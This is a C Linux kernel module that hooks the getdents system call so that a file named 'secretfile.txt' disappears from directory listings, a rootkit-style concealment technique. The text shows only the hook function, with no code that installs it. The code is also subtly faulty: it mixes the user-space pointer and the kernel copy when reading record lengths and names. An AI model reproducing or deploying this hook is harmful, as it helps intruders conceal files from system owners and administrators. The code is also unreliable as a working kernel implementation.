#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/kern_levels.h>
#include <linux/gfp.h>
#include <asm/unistd.h>
#include <asm/paravirt.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("RJ Pisciotta");
MODULE_DESCRIPTION("Simple Hooking Of a Syscall");
MODULE_VERSION("1.0");

struct linux_dirent {
	unsigned long d_ino; /* Inode number */
	unsigned long d_off; /* Offset to next linux_dirent */
	unsigned short d_reclen; // d_reclen is the way to tell the length of this entry. This is our file name. Every file has a different size so this is to take that into account
	char 	 d_name[]; // dirp = directory pointer
}*dirp2, *dirp3, *retn;

char hide[]="secretfile.txt";

/* Whenever you pass a structure to a function in C, its best to do this by a pointer (by reference).  */
asmlinkage int ( *original_getdents ) (unsigned int fd, struct linux_dirent *dirp, unsigned int count);

/* Our version of the Open Function */
asmlinkage int HookGetDents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {

struct linux_dirent *retn, *dirp3;
int Records, RemainingBytes, length;

Records = (*original_getdents) (fd, dirp, count);

if (Records <= 0) {
	return Records;
}

retn = (struct linux_dirent *) kmalloc(Records, GFP_KERNEL);
//Copy struct from userspace to our memspace in kernel space
copy_from_user(retn, dirp, Records);

dirp3 = retn;
RemainingBytes = Records;

while(RemainingBytes > 0) {
	length = dirp->d_reclen;
	RemainingBytes -= dirp3->d_reclen;

	printk(KERN_INFO "RemainingBytes %d    \t File: %s " , RemainingBytes , dirp->d_name );

	if(strcmp( (dirp3->d_name), hide ) == 0) {
		memcpy(dirp3, (char*)dirp3+dirp3->d_reclen, RemainingBytes);
		Records -= length; // dirp3->d_reclen
	}
	dirp3 = (struct linux_dirent *) ((char *)dirp3 + dirp->d_reclen);

   }
//Copy the record back to the original struct
copy_to_user(dirp, retn, Records);
kfree(retn);
return Records;
}
